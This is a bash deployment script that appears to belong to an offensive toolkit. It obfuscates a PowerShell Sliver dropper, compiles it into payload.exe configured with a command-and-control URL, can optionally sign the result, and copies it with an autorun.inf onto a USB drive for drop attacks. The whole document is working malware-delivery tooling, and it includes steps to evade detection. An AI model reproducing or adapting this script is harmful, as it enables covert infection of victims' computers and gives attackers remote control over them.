#!/bin/bash
# Enhanced USB Deployment Script (Phase 6)
# Usage: ./deploy-enhanced.sh --usb /Volumes/USB_NAME --c2-url http://c2:8080 --obfuscate --sign

set -e

# Defaults
C2_URL=""
OBFUSCATE=false
SIGN=false
USB_PATH=""
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# Parse args
while [[ $# -gt 0 ]]; do
	case $1 in
	--usb)
		USB_PATH="$2"
		shift 2
		;;
	--c2-url)
		C2_URL="$2"
		shift 2
		;;
	--obfuscate)
		OBFUSCATE=true
		shift
		;;
	--sign)
		SIGN=true
		shift
		;;
	*)
		echo "Unknown option: $1"
		exit 1
		;;
	esac
done

# Validate
if [ -z "$USB_PATH" ] || [ -z "$C2_URL" ]; then
	echo "[-] Usage: $0 --usb /path/to/usb --c2-url http://c2:8080 [--obfuscate] [--sign]"
	exit 1
fi

if [ ! -d "$USB_PATH" ]; then
	echo "[-] USB path not found: $USB_PATH"
	exit 1
fi

echo "[*] USB Deployment (Phase 6)"
echo "    USB: $USB_PATH"
echo "    C2: $C2_URL"
echo "    Obfuscate: $OBFUSCATE"
echo "    Sign: $SIGN"

# Step 1: Obfuscate if requested
DROPPER_PATH="$SCRIPT_DIR/lib/sliver-dropper-core.ps1"
if [ "$OBFUSCATE" = true ]; then
	echo "[*] Obfuscating..."
	powershell -NoProfile -Command ". '$SCRIPT_DIR/lib/obfuscation.ps1'; Obfuscate-PowerShellScript -ScriptPath '$DROPPER_PATH'" 2>/dev/null || true
	DROPPER_PATH="${DROPPER_PATH%.*}_obfuscated.ps1"
fi

# Step 2: Compile to .exe
echo "[*] Compiling to .exe..."
python3 "$SCRIPT_DIR/lib/ps2exe-wrapper.py" "$DROPPER_PATH" \
	-o /tmp/payload.exe \
	--c2-url "$C2_URL" \
	$([ "$SIGN" = true ] && echo "--sign" || true) 2>/dev/null || true

if [ ! -f /tmp/payload.exe ]; then
	echo "[-] Compilation failed"
	exit 1
fi

# Step 3: Copy to USB
echo "[*] Copying to USB..."
cp /tmp/payload.exe "$USB_PATH/"
cp "$SCRIPT_DIR/usb-autorun.inf" "$USB_PATH/autorun.inf"

echo "[+] Deployment complete!"
echo "[+] Files on USB:"
ls -lh "$USB_PATH/payload.exe" "$USB_PATH/autorun.inf"

# Cleanup
rm -f /tmp/payload.exe /tmp/payload_obfuscated.exe
